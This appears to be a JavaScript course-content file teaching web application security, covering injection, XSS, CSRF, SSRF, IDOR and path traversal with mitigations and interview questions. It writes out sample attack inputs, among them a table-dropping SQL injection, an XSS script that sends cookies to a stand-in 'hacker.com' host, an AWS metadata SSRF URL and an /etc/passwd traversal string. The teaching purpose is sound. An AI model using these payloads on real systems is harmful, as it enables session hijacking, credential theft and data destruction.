export const sec_02_web = {
  WEB_APP_SECURITY: {
    title: 'Web & Application Security',
    description: 'Deep dive into the OWASP Top 10, XSS, CSRF, SSRF, Injection attacks, and how to patch them.',
    difficulty: 'INTERMEDIATE',
    estimatedLearnTime: 120,
    prerequisites: ['Security Fundamentals & Threat Modeling'],
    learningContent: `
# Web & Application Security

Most successful hacks do not break cryptography; they exploit bad application logic. The OWASP Top 10 outlines the most critical web application security risks.

## 1. Injection (SQL, Command, NoSQL)
- **What it is:** Untrusted data is sent to an interpreter as part of a command or query.
- **Example:** A user enters \`'; DROP TABLE users; --\` into a login field. The DB executes it.
- **Mitigation:** ALWAYS use Parameterized Queries (Prepared Statements) or an ORM. Never concatenate strings to build SQL queries.

## 2. Cross-Site Scripting (XSS)
- **What it is:** An attacker injects malicious JavaScript into a web page viewed by other users.
- **Example:** An attacker leaves a comment: \`<script>fetch('hacker.com/?cookie='+document.cookie)</script>\`. When another user views the comment, their browser runs the script and steals their session cookie.
- **Mitigation:** Sanitize and HTML-encode all user input before rendering it in the browser. (Modern frameworks like React do this automatically, but \`dangerouslySetInnerHTML\` bypasses it). Use Content Security Policy (CSP) headers.

## 3. Cross-Site Request Forgery (CSRF)
- **What it is:** Forcing an authenticated user's browser to execute an unwanted action on a trusted site.
- **Example:** A user logs into bank.com. In another tab, they visit evil.com, which has a hidden form that submits a POST request to \`bank.com/transfer?amount=1000&to=hacker\`. Because the browser automatically attaches the bank.com session cookie, the bank thinks the user authorized it.
- **Mitigation:** Anti-CSRF Tokens (a hidden, unique token required for state-changing requests), and setting cookies to \`SameSite=Lax\` or \`SameSite=Strict\`.

## 4. Server-Side Request Forgery (SSRF)
- **What it is:** The attacker forces the backend server to make an HTTP request to an internal network address that the attacker cannot reach directly.
- **Example:** A web app lets you fetch a profile picture via URL. The attacker submits \`http://169.254.169.254/latest/meta-data/\` (The AWS internal metadata IP). The server fetches it and returns the server's IAM secret keys to the attacker.
- **Mitigation:** Validate all URLs against an allowlist. Never let user input directly control the destination of a server-side HTTP request.
`,
    fullNotes: `
# Detailed Notes: Web Vulnerabilities

- **Insecure Direct Object References (IDOR) / BOLA:** The most common API vulnerability. A user is logged in as User ID 5. They intercept the API call and change it from \`/api/users/5/receipts\` to \`/api/users/99/receipts\`. If the backend doesn't check if User 5 is *authorized* to view User 99's data, it's an IDOR.
- **Path Traversal:** An attacker inputs \`../../../etc/passwd\` into a file upload/download field to read sensitive OS files. Mitigation: Never use direct user input as a filename.
`,
    shortNotes: `
- SQL Injection: Use Prepared Statements / ORMs. Never concatenate strings.
- XSS: Malicious JS runs in the victim's browser. Mitigate by HTML encoding output.
- CSRF: Forcing the victim's browser to make a request. Mitigate with CSRF tokens and SameSite cookies.
- SSRF: Forcing your backend server to make a malicious request to the internal network.
- IDOR (BOLA): Accessing data you shouldn't by guessing IDs. Fix with strict authorization checks on every request.
`,
    cheatSheet: `
### XSS Types
1. **Stored XSS:** Payload is saved in the DB (e.g., a forum post). Hits anyone who views the page. Most dangerous.
2. **Reflected XSS:** Payload is in the URL (e.g., \`?search=<script>...\`). Requires tricking the victim into clicking a link.
3. **DOM-based XSS:** Payload is executed purely client-side by flawed JavaScript.
`,
    interviewQuestions: [
      { question: 'What is the difference between XSS and CSRF?', answerHint: 'XSS exploits the user\'s trust in the website by injecting malicious scripts into the page. CSRF exploits the website\'s trust in the user\'s browser by forcing the browser to automatically send session cookies along with a forged cross-origin request.', type: 'CONCEPTUAL' },
      { question: 'How do you prevent SQL Injection?', answerHint: 'By strictly separating code (the SQL command) from data (the user input). This is achieved using Parameterized Queries (Prepared Statements) provided by the database driver, or by using a modern ORM. The database compiles the SQL statement first, and treats the user input purely as a literal value, making it impossible to execute injected commands.', type: 'TECHNICAL' }
    ],
    resources: [
      { title: 'OWASP Top Ten Web Application Security Risks', url: 'https://owasp.org/www-project-top-ten/', type: 'ARTICLE', priority: 'S', source: 'OWASP', isOfficial: true }
    ]
  }
};
